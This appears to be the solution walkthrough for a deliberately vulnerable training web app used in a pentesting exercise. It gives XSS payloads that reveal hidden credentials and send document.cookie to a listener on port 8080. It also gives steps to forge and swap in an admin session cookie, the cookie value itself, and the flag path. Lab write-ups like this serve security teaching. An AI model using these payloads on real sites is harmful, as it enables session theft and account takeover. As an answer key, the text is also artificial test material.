### In the original readme.txt given to pentesters in the vm
Run the webserver:
source venv/bin/activate
python3 vulnQuest.py


### This is not in the readme.txt in the vulnerable vm this is just going over commands that were mentioned in the project report
The commands we are looking for are the following:
In public pages run the `<img src=x onerror="document.getElementById('credentials').style.display='block';">` in the input box to reveal: username=radin3600&password=xssvuln21
Login as radin3600 with password xssvuln21
In the home page enter this command: `<img src="nonexistent.jpg" onerror="this.src='http://0.0.0.0:8080/?'+document.cookie;">` to send cookie session info to a http.server at port 8080 (or any port)
Run admin_bot_runner.py to simulate the admin logging in and having their info stolen.
The pentesters will complete the session_encode.py using the hints given and the file, then using the admin session key to encode it and get the cookie code.
Going back to the web page and in firefox insepct mode > storage and changing the session cookie from radin3600 to the one of the admin which is:
.eJyrVkpMyc3Miy9OLS7OzM-Lz06tVLJSSklNSyzNKYlHkVPSUSJOVWlxalF8ZoqSlSGEnZeYmwpUDlamVAsAqMop5g.ZvRGhQ.UGQ_LDjO7SUNFpSkChIMFbmlF0c
Then reload the page and you will be automatically logged into the admin, by hijacking the session.
In the url changing the page to /flag gives you the flag.